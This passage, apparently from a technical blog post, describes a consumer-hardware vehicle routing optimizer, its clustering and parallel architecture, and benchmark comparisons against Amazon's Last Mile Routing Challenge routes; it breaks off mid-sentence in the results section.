&mdash; no cloud, GPUs, or enterprise servers &mdash;</li><li><strong>Impact (global):</strong> achieves <strong>~15&ndash;20% less total distance</strong>, <strong>~10&ndash;15% fewer routes</strong>, and <strong>~10&ndash;20% higher average vehicle utilization</strong>, while still <strong>meeting vehicle capacity and time-window constraints</strong>.</li><li><strong>How it&rsquo;s measured:</strong> all metrics are <strong>against Amazon&rsquo;s baselines from the official Last Mile Routing Research Challenge dataset</strong>, recomputed with the same per-leg, multi-engine pipeline and reported as a <strong>blended average</strong> across engines for fair comparison.<br>The optimizer uses the <strong>same fleet composition, vehicle capacities, and volumes as Amazon&rsquo;s plans</strong>.</li><li><strong>Scaling behavior:</strong> efficiently handles <strong>massive datasets without theoretical limits</strong> by splitting workloads into <strong>configurable batches</strong> that fit the available hardware. By decomposing the exponential VRP into parallelizable atomic tasks, the system <strong>achieves near-linear runtime</strong> growth on the same machine.</li><li><strong>What you can control:</strong> Fleet load targets (e.g., ~80% average capacity), fleet size and types, <strong>per-vehicle limits </strong>(stops/volume/weight), and <strong>time-window </strong>mode with estimated start times.</li><li><strong>New paradigm:</strong> <strong>No pre-defined zones</strong>. Stops are grouped dynamically by <strong>true geographic proximity and density</strong>, creating natural and efficient routes without depending on arbitrary areas.</li><li><strong>Business takeaway:</strong> predictable runtimes, lower infrastructure cost, and clear reductions in kilometers traveled and fleet size &mdash; without compromising operational constraints.</li></ul></div><div><h2>Background &amp; Motivation</h2><p>Some time ago, I developed a route optimizer for a small client. The goal was simple: organize delivery orders, assign them to vehicles, and minimize travel distance and time. At that stage, the scale was modest &mdash; around 15 vehicles and fewer than 12 stops per route. Using standard optimization techniques, I built a solution that performed well and produced results in an acceptable time.</p><p>Later, I decided to test how far my solution could scale. I added more vehicles and more stops. At a certain point, my laptop could no longer finish runs within a reasonable time or memory limits. The approach worked for small cases, but it wasn&rsquo;t scalable.</p><p>I introduced concurrency, caching, and other optimizations, yet I still couldn&rsquo;t handle more than ~10,000 stops without exhausting resources. While searching for benchmarks, I discovered the <a href="https://routingchallenge.mit.edu/"><strong>Amazon Last Mile Routing Research Challenge (2021)</strong></a>, which features real-world datasets of an entirely different magnitude, where a single depot could manage <strong>1,100+ routes and ~174,000 stops.</strong> A scale that presents a challenge, far beyond what conventional algorithms (or standard hardware) can handle.</p><p>That became the new target: to take my initial prototype and make it powerful enough to solve Amazon&rsquo;s challenge, but on <strong>consumer hardware only (</strong>my personal <strong>MacBook Pro M1 &mdash; 16 GB RAM</strong>).</p><p>Over time, I built a solution that not only processed the massive dataset but also <strong>outperformed Amazon&rsquo;s reported routes </strong>&mdash; reducing distance and increasing vehicle utilization &mdash; while respecting real-world constraints.</p></div><div><blockquote><p><strong><em>1. Part I &mdash; Problem &amp; Data Foundations</em></strong></p></blockquote><h2>1.1 The Problem: Last-Mile Delivery Complexity</h2><p>Last-mile delivery &mdash; the final stretch from warehouse (depot/station) to customer &mdash; accounts for up to 50% of total logistics costs. <br>The core challenge is solving the <strong>Vehicle Routing Problem (VRP)</strong> with vehicle capacity constraints and delivery time windows, while avoiding typical solutions where processing times grow exponentially with the number of stops. <em>This variant is technically called </em><strong><em>CVRPTW</em></strong><em> (Capacitated Vehicle Routing Problem with Time Windows).</em></p><h2>1.2 Why Last-Mile Delivery Is So Challenging</h2><p>At city scale, last-mile routing fails not because the goal is unclear, but because <strong>the search space and the operational constraints explode together:</strong> the combinatorial number of ways to order stops, and real-world constraints.</p><h3>1.2.1 Exponential Complexity</h3><p>Even in the simplified single-vehicle case, the number of possible tours for <code>n</code> stops is <code>(n-1)!/2</code></p><p>That means a small increase in stops multiplies the search space enormously. Even with <strong>aggressive parallelism</strong> and <strong>optimistic per-route cost</strong>, exhaustive search becomes impossible after a few dozen stops.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 1.</strong> Exponential explosion of brute-force solution space</figcaption></figure><p>To put this in perspective: A brute-force solution for 100 stops would take <strong>over 10&sup1;&sup2;&#8313; times longer than the universe has existed</strong> &mdash; a number so large it defies practical comprehension.</p><h3><strong>1.2.2 Scale and Infrastructure Challenges: Why Route Optimization Breaks at Scale</strong></h3><h3>Hardware Limitations</h3><ul><li><strong>Distance matrices</strong> grow quadratically (<em>n&sup2; entries: 1,000 stops = 1M distance calculations</em>). Full city-scale distance matrices exceed memory limits.</li><li><strong>Processing time</strong> grows exponentially with problem size.</li><li><strong>Traditional algorithms</strong> collapse at large scales on consumer hardware. VRP requires <strong>high-end infrastructure</strong> (64+ CPU cores, GPU acceleration, or distributed computing)</li></ul><h3>The Limits of Today&rsquo;s Routing Solutions</h3><p>Last-mile large-scale route optimization faces a dual challenge: the combinatorial explosion of NP-hard complexity and the <strong>practical limits of existing solvers</strong>.</p><ul><li>Specialized tools like <strong>Google&rsquo;s OR-Tools</strong> face significant limitations: While excellent for moderate-scale solutions (hundreds of stops), problems requiring multiple vehicle assignments for high-demand locations can result in exponential solve times or no solution at all.</li><li><strong>Advanced routing solutions</strong> remain typically <strong>proprietary</strong>, developed and maintained by large companies with dedicated infrastructure. Industry leaders like Amazon rely on massive distributed systems running on hundreds of CPU cores in cloud infrastructure.</li><li><strong>Commercial SaaS services</strong> impose strict operational limits: most cap requests at <strong>1,000&ndash;5,000</strong> stops per optimization run, making them unsuitable for true city-scale logistics (100,000+ stops).</li></ul><h3>Workarounds and Their Trade-Offs</h3><p>Many operators try to &ldquo;patch&rdquo; these limitations with shortcuts, but each comes with trade-offs that degrade solution quality.</p><ul><li><strong>Splitting stops into smaller groups</strong> breaks route continuity, often resulting in disconnected or inefficient overall solutions.</li><li><strong>Standard clustering techniques</strong> ignore real-world vehicle constraints such as package volumes and weight limits.</li><li><strong>Artificial stop caps</strong> (e.g., 1,000 per run) <strong>force pre-zoning</strong>, simplifying computation but distorting results by fixing zones in advance rather than emerging from optimization. These approaches make the problem <strong>easier to compute, but at the cost of efficiency and realism</strong>.</li></ul><h2>1.3 The Amazon Challenge Context</h2><p>To benchmark at a realistic scale, this work uses the <strong>Amazon Last Mile Routing Research Challenge (2021)</strong> <a href="https://registry.opendata.aws/amazon-last-mile-challenges/">dataset</a> and compares against Amazon&rsquo;s own reported routes. Evaluations focus on: total kilometers traveled, number of routes (fleet efficiency), compliance with delivery time windows, and computational efficiency on consumer hardware.</p><p>To compare fairly, I first needed to reconstruct Amazon&rsquo;s actual routes from the raw files before measuring distances and times.</p><h2>1.4 Route Reconstruction Methodology: From Raw Amazon Data to Visualized Routes</h2><h3>1.4.1 Data Integration</h3><p>The original dataset comes as multiple disconnected JSON files (<code>route_data.json</code>, <code>actual_sequences.json</code>, <code>package_data.json</code>, <code>travel_times.json</code>). All files are merged by their shared identifiers (<code>route_id</code>, <code>stop_id</code>) to create a unified view of each route.</p><p>The complete dataset contains <strong>6,112 historical routes </strong>with 543,485 unique locations<strong> (totaling 1,048,575 stops)</strong> across five major US metropolitan areas:</p><p><strong>Los Angeles:</strong> 2,888 routes, 6 depots<br><strong>Seattle:</strong> 1,079 routes, 3 depots<br><strong>Chicago:</strong> 1,002 routes, 4 depots<br><strong>Boston:</strong> 929 routes, 3 depots<br><strong>Austin:</strong> 214 routes, 1 depot</p><p>Routes are organized by <strong>17 depot stations</strong> distributed across these cities.<br>On average, routes in the Amazon dataset contain <strong>around ~148 stops</strong> and <strong>~240&ndash;250 packages.</strong></p><h3>1.4.2 Building the Route JSON</h3><p>The integrated data is transformed into a single structured JSON for each route, preserving the station code, ordered sequence of stops, and packages assigned to each stop. This allows exact replication of the driver&rsquo;s actual path:</p><p><strong><em>Route -&gt; Ordered Sequence of Stops -&gt; Packages per Stop.</em></strong></p><pre><span>{<br> "route_id": "RouteID_04189f85-13a6-47b8-a78e-ec5688be0819",<br> "station_code": "DLA9", // Depot identifier for route origin and return point<br> "executor_capacity_cm3": 4247527, // Vehicle cargo capacity in cubic centimeters<br> "addresses": [<br> {<br> "stop_id": "CR",<br> "zone_id": "A-8.3C", // Original Amazon zone encoding for reference (Region-Area.Zone format)<br> "lat": 42.34873,<br> "lng": -71.074241,<br> "packages": [<br> {<br> "package_id": "c1ee7bdc-5846-4931-b8cd-60541780fc94",<br> "dimensions": { "length": 30.2, "width": 17.5, "height": 5.3 }, // Package size constraints affecting vehicle loading<br> "time_window": { "start": "2018-08-04 05:00", "end": "2018-08-05 04:59", "time_zone": "UTC" } // Customer delivery preferences with timezone data<br> }<br> // ... more packages<br> ]<br> }<br> // ... more stops in sequence<br> ]<br>}</span></pre><h3><strong>1.4.3 Visualization &amp; Analysis</strong></h3><p>The unified JSON structure enables direct mapping and route visualization, allowing a clear comparison between optimized routes and Amazon&rsquo;s actual delivery strategies.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 2. </strong>Actual <strong>Amazon delivery routes</strong> from the smallest depot (DBO1) in the dataset, containing <strong>60 routes</strong> with <strong>8,205 stops</strong>.</figcaption></figure></div><div><blockquote><p><strong><em>2. Part II &mdash; Solution (Techniques &amp; Architecture)</em></strong></p></blockquote><h2>2.1 The Solution Approach</h2><p>Instead of chasing mathematically perfect routes, the Optimizer uses <strong>intelligent heuristics and parallelism</strong> to reach near-optimal solutions in minutes.</p><p>The key is<strong> not a single algorithm</strong>, but an architecture that runs efficiently on consumer hardware. All computation <strong>runs fully offline</strong> (no third-party APIs or external services for the optimization itself). External engines may be used later for benchmarking/validation, but they do not participate in the optimization process.</p><h2>2.2 The Core Insight: Divide and Conquer</h2><p>The breakthrough comes from recognizing that you don&rsquo;t need to solve the entire VRP at once. Instead:</p><ol><li><strong>Cluster addresses</strong> into manageable groups based on proximity and capacity</li><li><strong>Solve smaller VRPs</strong> within each custom cluster using efficient algorithms</li><li><strong>Parallelize processing</strong> across multiple CPU cores</li><li><strong>Cache intermediate results</strong> to avoid redundant calculations</li><li><strong>Aggregate solutions</strong> into a coherent global optimization</li></ol><h2>2.3 Key Principles That Guide the Solution</h2><p>Based on extensive testing against real-world datasets, these principles form the foundation:</p><h3>2.3.1 Reduce Overlap via Clean, Separated Clusters</h3><p>Street overlap between vehicles equals wasted resources. The algorithm optimizes <strong>route distribution to minimize redundant street usage</strong>, reducing fuel costs, travel time, and unnecessary traffic while maximizing coverage efficiency.</p><p>Below, we compare clustering strategies. Each color represents the route of a single vehicle. While I don&rsquo;t have specific knowledge of Amazon&rsquo;s exact algorithmic approach, it is evident that Amazon&rsquo;s routes exhibit significant overlap, with multiple vehicles traversing the same paths and areas.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 3. </strong>Amazon baseline routes (overlap) &mdash; depot DLA9 in the Los Angeles metropolitan area.</figcaption></figure><p>In contrast, I employ a different strategy focused on creating well-defined, separated clusters. This approach aims to atomize each cluster by maintaining clear boundaries between service areas, thereby minimizing route overlaps and reducing redundancy in vehicle paths.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 4. </strong>Optimizer routes (overlap minimized). Same area clustered and sequenced by the algorithm &mdash; depot DLA9 in the Los Angeles metropolitan area</figcaption></figure><h3>2.3.2 Optimize Load Without Sacrificing Performance</h3><p>The system lets you set minimum and maximum load targets (e.g., 70&ndash;90% vehicle capacity). While higher utilization looks efficient on paper, pushing fleets near 100% often backfires: routes become longer, delivery times increase, and time-window violations become more frequent.</p><p>The sweet spot is <strong>~75&ndash;85%</strong>, which balances efficiency with operational flexibility. In some cases, allowing a few extra routes can actually improve on-time performance without significantly increasing total kilometers.</p><h3>2.3.3 Quality Clusters Beat Perfect Paths</h3><p>A slightly suboptimal path within a high-quality cluster is better than a &ldquo;perfect&rdquo; path in a poorly formed cluster. <strong>Good clustering eliminates zigzags by design</strong>.</p><h3><strong>2.3.4 Density-Driven Consolidation Logic</strong></h3><p>The optimizer dynamically adjusts its parameters based on addresses, packages, and geographic density. <strong>Consolidation</strong> refers to how many deliveries are grouped into a single route or vehicle:</p><p><strong>&bull; High density</strong> &rarr; more consolidation: fewer routes, fuller vehicles, higher efficiency.<br><strong>&bull; Low density</strong> &rarr; less consolidation: more routes, lighter loads, greater flexibility.</p><p>Efficiency targets can be tuned: conservative ratios (e.g., 70%) leave slack, while aggressive ones (e.g., 90%) push for maximum consolidation. This density-aware logic allocates resources according to <strong>real geography and package distribution</strong>, not static parameters.</p><p>Although the optimizer can start from a user-defined fleet size, it calculates the <strong>optimal distribution of routes and vehicles</strong> based on stops, density, packages per stop, and fleet availability.</p><h2>2.4 How It Works: The Technical Flow</h2><p>The system transforms raw address data into optimized routes through five efficient steps:</p><h3><strong>Step 1: Data Ingestion, Validation, and Preprocessing</strong></h3><p>Large-scale requests (100k+ addresses) are loaded and validated early. To stay memory-efficient, the data is batched into subsets, geocoded, and paired with fast initial distance estimates (via haversine or cached OSM legs). Distance matrices are cached on demand, cutting recomputation by ~90%. At this stage, the system also <strong>detects geographic density patterns, </strong>an early hint of how stops will later be grouped into clusters.</p><h3>Step 2: Intelligent Clustering</h3><p>Delivery stops are clustered based on proximity and density, but also guided by package volumes and vehicle capacity. This creates balanced, ready-to-route groups that are both spatially coherent and logistically feasible, with <strong>sizes aligned to vehicle capacity and efficiency targets</strong>.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 5. </strong>Each circle represents a delivery stop requiring service. All stops must be distributed among three vehicles, with the initial clustering to create a preliminary route assignment.</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 6. </strong>Initial clustering results show delivery points organized into three zones, utilizing geographic proximity and enhanced with package volume estimates.</figcaption></figure><h3>Step 3: Rebalancing</h3><p>Clusters are iteratively adjusted by redistributing stops to smooth out imbalances. Each cluster maintains awareness of neighboring clusters and can negotiate package transfers with adjacent zones, ensuring that no vehicle is overloaded or underutilized. This adjustment respects capacity, volume, and stop limits while producing a more balanced workload across the fleet and higher overall route efficiency.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 7. </strong>The initial clustering results show unbalanced workload distribution. Arrows indicate delivery stops that <strong>need to be redistributed from overloaded clusters</strong> to achieve better balance.</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 8. </strong>After <strong>rebalancing</strong>, the clusters achieve a more balanced distribution. The algorithm has successfully redistributed delivery stops between neighboring clusters, improving workload balance while maintaining <strong>geographic coherence and satisfying vehicle capacity constraints</strong></figcaption></figure><h3>Step 4: Atomic Route Processing</h3><p>The system breaks down clusters into independent tasks and pulls them one by one into isolated CPU processes. At this stage, each cluster of delivery points<strong> is converted into a true delivery route</strong>: a sequential, ordered path that a driver could follow.</p><p>Routes are optimized independently, <strong>without shared state or dependencies</strong>. When a process finishes, it pulls the next task, keeping all cores busy and enabling true parallel optimization.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 9. </strong>Clusters are decomposed into independent tasks placed in a central queue. Each CPU core pulls the next available task, ensuring full parallelization and continuous workload utilization.</figcaption></figure><h3>Step 5: Route Integration and Metrics Calculation</h3><p>All independently processed routes are <strong>merged into a unified solution</strong>. Metrics such as total distance, delivery time efficiency, vehicle utilization, and constraint compliance are then aggregated to provide a complete picture of network performance. This final step transforms route-level outputs into actionable, system-wide insights.</p><h2>2.5 Key Techniques That Enable Linear Scale</h2><h3>Parallel Atomic Tasks</h3><p>Break computations into small, independent tasks,<strong> enabling concurrency without shared state</strong>. The pipeline is divided into ingest &rarr; cluster &rarr; rebalance &rarr; route &rarr; aggregate (see 2.4).</p><p>This <strong>architectural approach</strong> enables <strong>near-linear scaling</strong>: more routes create more atomic tasks, and processing time increases proportionally on the same hardware. While additional CPUs or memory can accelerate performance, it isn&rsquo;t mandatory, since workloads are automatically batched to fit available resources regardless of dataset size.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 10. </strong>The plot compares how processing <strong>time increases as the number of delivery stops grows</strong><em>. </em>It highlights how scaling to tens of thousands of stops drives computation time upwards, but still within feasible ranges</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 11. </strong>The plot compares how execution <strong>time scales with the number of optimized routes. </strong>The runtime grows linearly with the number of routes</figcaption></figure><h3>Key advantages</h3><p><strong>Hardware-adaptive batching</strong>: Large datasets are divided into batches that adapt to CPU and RAM limits (Full utilization without overload).</p><p><strong>Memory-efficient processing</strong>: Technically, it can handle <strong>unlimited stop counts</strong> by processing data in optimized chunks.</p><p><strong>In practice: </strong>whether routing 100 or 100K delivery points, the same hardware can handle both &mdash; the only difference is processing time.</p><h2>2.6 Intelligent Caching</h2><p>To eliminate redundant calculations, the system implements multi-level caching:</p><p><strong>In-Memory Graph &amp; Matrix Caching</strong>: Optimized graphs, distance matrices, and precalculated files are loaded directly into memory, avoiding repeated recomputation (typically a few MB per graph). This lets the Optimizer reuse results instantly instead of rebuilding them every time, making them lightweight enough to cache efficiently.</p><p><strong>Distance Query Caching:</strong> Frequently used distance queries are cached, cutting computation overhead dramatically.</p><p><strong>Route-Specific Graph Creation</strong>: Instead of loading one massive graph for an entire region (which could consume <strong>GBs of memory</strong>), the system generates small, focused mini-graphs (<strong>25&ndash;50 MB each</strong>) around the active service area. These localized files become the inputs later cached in memory, ensuring that ~70&ndash;90% of route calculations can reuse existing graphs while minimizing memory use and maintaining full routing accuracy.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 12. </strong>Relationship between calculated routes (red rectangles) and cached graphs (blue rectangles). On average, each cached graph handles approximately <strong>10x</strong> individual routes.</figcaption></figure><p>These mini-graphs also follow a <strong>dynamic lifecycle</strong>: created on demand for each route request, stored in memory with a location-based key, reused when areas overlap, and cleaned up once inactive. This guarantees bounded memory usage, faster startup (no need to preload entire regions), and scalability that grows with active routes rather than with the total dataset size.</p><h2>2.7 Complete System Parameterization</h2><p>The system is highly configurable, and outcomes can vary significantly depending on the chosen setup. For example:</p><p>Prioritizing <strong>time windows</strong> may require adding extra routes to guarantee punctuality. Pushing for <strong>maximum vehicle load</strong> reduces fleet size but can increase travel inefficiency.</p><p>By default, the Optimizer pursues a balanced objective targeting high fleet utilization, minimal kilometers, and on-time service. When required, the system can be configured to enforce specific strategies (maximizing fleet load) even at the expense of other metrics.</p><h3>2.7.1 Smart Load Balancing</h3><p><strong>Per-vehicle</strong>: minimum/maximum load percentages to prevent both underfilled and overloaded trips (e.g., 60&ndash;85%).<br><strong>System-wide</strong>: a global load target (e.g., ~80%) toward which average utilization converges across routes and batches.</p><h3>2.7.2 Routing &amp; Time Windows</h3><p><strong>Optimization criteria</strong>: length vs. travel time vs. balanced approach<br><strong>Time window handling</strong>: enable/disable time window optimization</p><p>Increasing load targets typically reduces route count but tends to lengthen routes and increase time-window pressure. Prioritizing time over distance protects punctuality at the cost of a few additional routes. In dense areas, consolidation can be more aggressive; in sparse regions, prefer smaller routes and slightly lower load targets to avoid zigzags.</p><h2>2.8 On-Demand Routing</h2><p>Beyond static planning, the optimizer also supports inserting new stops <strong>on demand</strong> into an already optimized solution. When extra stops appear after the initial plan is set, the system evaluates each new stop and assigns it to the most suitable route, respecting vehicle capacities, time-window constraints, and existing workloads. This allows the solution to <strong>reorganize routes in real time</strong>, ensuring late-arriving orders can still be delivered efficiently.</p><p>While today this runs as a service that accepts new stops and rebalances them within existing routes, <strong>the design is forward-looking</strong>: it lays the foundation for a future <strong>dynamic routing system</strong> capable of continuous adjustments during the delivery day, reacting to traffic, cancellations, urgent new requests, or mixed delivery and pickup operations.</p></div><div><blockquote><p><strong><em>3. Part III &mdash; Results &amp; Performance Analysis</em></strong></p></blockquote><h2>3.1 Evaluation Methodology</h2><p>To ensure fair evaluation, both Amazon&rsquo;s original routes and the optimized ones are analyzed with the same multi-engine pipeline.</p><h3>3.1.1 Multi-Engine Distance Calculation:</h3><p>Distances are calculated with multiple engines, then averaged into a blended metric for fair comparison:</p><ul><li><strong>Local Graph (OpenStreetMap-based)</strong>: A local road graph from OpenStreetMaps (OSMnx library), producing consistent estimates based on static road layouts. Here, the distances reported are strictly those computed by the service&rsquo;s own logic.</li><li><strong>Local OSRM (OpenStreetMap-based)</strong>: A self-hosted routing engine serving a preprocessed OSM road graph.</li><li><strong>OpenRouteService (hosted API)</strong>: A public routing service powered by OpenStreetMap, returning real-world road distances and times (api.openrouteservice.org).</li><li><strong>Google Directions API</strong>: A commercial, industry-standard routing engine that factors in real-time traffic and dynamic road conditions.</li></ul><h3>3.1.2 Distance Calculation Workflow</h3><p>Most routing engines limit the number of waypoints per request (typically 25&ndash;50). Longer routes are automatically split into smaller segments, processed sequentially, and recombined into route totals, which are then aggregated at the depot level.<br>[<strong>segment totals &rarr; route totals &rarr; depot totals</strong>]</p><h3>3.1.3 Operational Metrics</h3><p>Beyond distance, performance is measured by route count, stops per route, vehicle utilization, and load efficiency &mdash; capturing <strong>how effectively the fleet is balanced</strong>.<br>The dataset also includes time windows <strong>(TW) </strong>for <strong>~7&ndash;8% of stops</strong>. <strong>Amazon&rsquo;s original plans missed ~1.8% </strong>of these, a baseline for comparing optimizer performance.</p><h2>3.2 Depots and Scale Classes</h2><p>To contextualize the performance results, depots in the dataset can be grouped into three operational scales based on their stop counts:</p><ul><li><strong>Small (5K&ndash;30K):</strong> DBO1 (8,205), DSE2 (12,962), DLA3 (29,497)</li><li><strong>Medium (30K&ndash;80K):</strong> DAU1 (31,060), DSE5 (78,039), DSE4 (63,701)</li><li><strong>Large (80K&ndash;175K+):</strong> DLA7 (173,738), DBO3 (90,362), DLA9 (98,181)</li></ul><h2>3.3 Real-World Performance Validation</h2><p>To validate the route optimization algorithm&rsquo;s effectiveness, I analyzed two depots of very different scales, demonstrating consistent performance improvements across varying operational complexities.</p><h3>3.3.1 Study Design &amp; Methodology</h3><p>Both case studies follow the same comparative framework:</p><ul><li>Comparison between Amazon&rsquo;s baseline routes and the optimizer&rsquo;s solution on the same stop data.</li><li><strong>Metrics</strong>: Route count, vehicle utilization, stops per route, and total distance across multiple routing engines</li></ul><h3>3.3.2 Case Study 1: Small-Scale Operations (DSE2, 125 routes)</h3><h3>Scenario Overview</h3><ul><li><strong>Location</strong>: DSE2 Depot, Seattle metropolitan area</li><li><strong>Total stops</strong>: 12,962 (<strong>1,230 time-window constraints</strong>)</li><li><strong>Total packages:</strong> 27,022 (2.08 packages per stop)</li><li><strong>Amazon baseline fleet: </strong>125 routes, 80 V2 + 45 V3 vehicles</li></ul><h3>3.3.3 Performance Results (DSE2)</h3><p>Amazon used 80 V2 + 45 V3 vehicles. The optimizer achieved the same demand with only <strong>51/80 V2</strong> and all <strong>45 V3 </strong>vehicles, cutting distance by <strong>~31%</strong> while reducing the active fleet. This was achieved by increasing load density per vehicle, resulting in higher utilization and fewer routes overall.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 13 </strong>DSE2 Results: Fewer routes, higher utilization, and ~31% less distance compared to Amazon&rsquo;s baseline.</figcaption></figure><h3>Time-Window Compliance (DSE2)</h3><p>In addition to distance and utilization, I also measured <strong>time-window (TW) compliance</strong>. Out of <strong>1,230 stops</strong> with time-window constraints (covering a total of <strong>2,497 packages</strong>), the optimizer successfully placed <strong>1,225 stops</strong> within their assigned windows.<br>Only <strong>5 stops</strong> fell outside, representing a violation rate of just <strong>0.41%</strong> &mdash; both when measured by stops and by packages. For comparison, Amazon&rsquo;s original plans in the dataset show an average violation rate of ~<strong>1.8%</strong>, meaning the optimizer achieved a substantially lower rate of missed windows under identical constraints.</p><h3>3.3.4 Visual Analysis (DSE2)</h3><p>The optimization reveals improvements in route clustering and <strong>overlap reduction</strong>:</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 14.</strong> DSE2 &mdash; Amazon routes (12,962 stops; 125 routes). Network showing significant overlap</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 15.</strong> DSE2 &mdash; Optimizer routes (12,962 stops; 96 routes). Network with cleaner territorial divisions</figcaption></figure><h3>3.3.5 Zoomed-in Cluster Comparison &mdash; Overlap Reduction and Balanced Partitioning</h3><p>The zoomed-in comparison (<em>Figures 16&ndash;17</em>) illustrates how the optimizer achieves cleaner territorial divisions within specific sub-regions, eliminating the route overlap visible in Amazon&rsquo;s original configuration.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 16.</strong> DSE2 &mdash; Zoomed-in <strong>Amazon</strong> actual routes</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 16.</strong> DSE2 &mdash; Zoomed-in <strong>Optimizer</strong> routes</figcaption></figure><h3>3.3.6 Full Route and Segment Data (DSE2, Seattle) &mdash; Validating Routes with Google&rsquo;s API</h3><p>To complement the DSE2 case study, I provide <strong>the complete per-route segment files</strong>, calculated with <strong>Google Directions API</strong>. Each route is split into main segments (&le;25 waypoints, API limit) and further into sub-segments (&le;8 waypoints, visualization limit).</p><p>These files allow you to inspect the full routing logic, step by step, for both <strong>Amazon&rsquo;s baseline (125 routes)</strong> and the <strong>Optimizer&rsquo;s solution (96 routes)</strong>.</p><p><a href="https://drive.google.com/file/d/1HSHLxOCagJfbTHjxy4y0_PU7GuEAKydJ/view?usp=drive_link">Amazon Baseline Routes</a> (125 routes): <strong>5,156.63 km</strong><br><a href="https://drive.google.com/file/d/1WcPskAePESCOlN6Cp6J0S9CtE5S1pNoB/view?usp=drive_link">Optimizer Routes</a> (96 routes):<strong> 3,410.03 km </strong>(&asymp;34% less distance)</p><h3>3.3.7 Case Study 2: Large-Scale Operations (DLA7, 1133 routes)</h3><h3>Scenario Overview</h3><ul><li><strong>Location</strong>: DLA7 Depot, Los Angeles metropolitan area</li><li><strong>Total stops</strong>: <strong>173,738</strong> delivery stops (<strong>9,609 time-window constraints</strong>)</li><li><strong>Total packages:</strong> 264,302 (1.52 packages per stop)</li><li><strong>Amazon baseline fleet: </strong>1133 routes, 1133 V2 vehicles</li></ul><h3>3.3.8 Performance Results (DLA7)</h3><p>For DLA7, results are computed using the same per-leg methodology, but analysis is limited to three routing engines: Local OSM Graph, OSRM, and OpenRouteService. Google Maps API was excluded from this analysis due to the exceptionally high volume of API requests required, which would result in significant cost implications.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 18.</strong> DLA7 Results: Fewer routes, higher utilization, and ~31% less distance compared to Amazon&rsquo;s baseline.</figcaption></figure><h3>3.3.9 Visual Analysis (DLA7)</h3><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 19.</strong> DLA7 &mdash; Amazon routes (173,738 stops; 1133 routes). Network showing significant overlap</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 20.</strong> DLA7 &mdash; Optimizer routes (173,738 stops; 946 routes). Network with cleaner territorial divisions</figcaption></figure><h3>3.3.10 Zoomed-in Cluster Comparison (DLA7)</h3><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 21.</strong> DLA7 &mdash; Zoomed-in <strong>Amazon</strong> actual routes</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 22.</strong> DLA7 &mdash; Zoomed-in <strong>Route Optimizer</strong> result clustering routes</figcaption></figure><h2><strong>3.4 Cross-Scale Consistency</strong></h2><p>Although the two examples differ dramatically in scale &mdash; DSE2 with ~13k stops vs. DLA7 with ~174k stops, <strong>nearly 13&times; larger</strong> &mdash; the optimization gains remain similar.</p><p>The improvements are <strong>not limited to small scenarios</strong> but scale reliably to large operations. While these two case studies highlight substantial efficiency gains, <strong>not every depot will exhibit improvements of the same magnitude</strong>.</p><h2>3.5 Detailed Route Visualization</h2><p>When zooming into individual routes generated by the optimizer, we can inspect the full delivery sequence at a granular level. Each stop is assigned a <strong>sequential index</strong> that represents the exact order a driver would follow.</p><p>It provides a verifiable record for <strong>manual auditing and quality assurance</strong>.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 19. </strong>Detailed sequencing of a generated route by the Optimizer</figcaption></figure><h2>3.6 Cross-Scenario Comparisons (All Depots)</h2><h3>3.6.1 Average Distance (km) &mdash; Amazon vs Optimizer</h3><p>These charts illustrate the total kilometers traveled across all depots, comparing Amazon&rsquo;s baseline routes (blue) with the optimized routes produced by the Router Optimizer (green).</p><p>Each bar pair shows the average total kilometers required to serve each depot. In this dataset, the Optimizer reduces kilometers across every depot &mdash; some only modestly (DBO1), others substantially (DLA7) &mdash; while serving the same delivery workload.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 20. </strong>Total kilometers traveled across all depots, comparing Amazon&rsquo;s baseline routes (blue) with the optimized routes produced by the Router Optimizer (green).</figcaption></figure><p><strong>Trend across all depots:</strong> Improvements are not random but follow a robust and reproducible pattern. The bigger the problem, the more competitive the optimizer becomes compared to Amazon&rsquo;s baseline routes.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 21. </strong>Improvement % vs. Initial Amazon km count: The larger the depot, the greater the efficiency gains</figcaption></figure><h3>3.6.2 Fleet Size vs Capacity Utilization (All Depots)</h3><p>In most depots, the optimizer cuts routes while raising utilization (cargo efficiency). By packing stops more coherently, the fleet runs with a <strong>higher average load</strong> while requiring <strong>fewer vehicles</strong>.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 22 &mdash; </strong>Fleet Size vs Cargo Efficiency (All Depots). Bars (left axis) represent the number of routes, and lines (right axis) show how much vehicle capacity was actually used.</figcaption></figure><h3>3.6.3 Improvement % vs Routes (count)</h3><p>Smaller scenarios (under 200 routes) display high variability, ranging from 